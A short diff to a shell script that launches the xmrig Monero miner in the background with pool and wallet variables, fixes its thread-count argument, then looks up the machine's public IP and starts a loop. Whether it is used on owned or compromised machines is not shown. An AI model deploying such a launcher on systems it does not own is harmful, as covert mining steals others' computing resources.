@@ -16,7 +16,7 @@ fi
 
 echo $thread
 
-./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=testaddmore -k --coin=monero --threads $run_thread &
+./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=testaddmore -k --coin=monero --threads $thread &
 
 ip=$(curl ipinfo.io)
 while true
